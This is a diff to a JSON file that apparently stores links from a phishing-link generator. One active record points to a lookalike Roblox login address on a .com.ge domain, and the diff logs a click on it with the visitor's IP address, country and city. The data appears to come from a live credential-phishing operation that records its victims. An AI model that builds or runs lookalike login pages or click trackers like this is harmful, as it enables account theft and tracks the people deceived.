@@ -14328,8 +14328,17 @@
     "targetUrl": "https://www.roblox.com.ge/login",
     "createdAt": 1778859842010,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "generator",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1778859844880,
+        "ip": "86.126.8.225",
+        "country": "Romania",
+        "city": "Bucharest",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
+      }
+    ]
   }
 ]
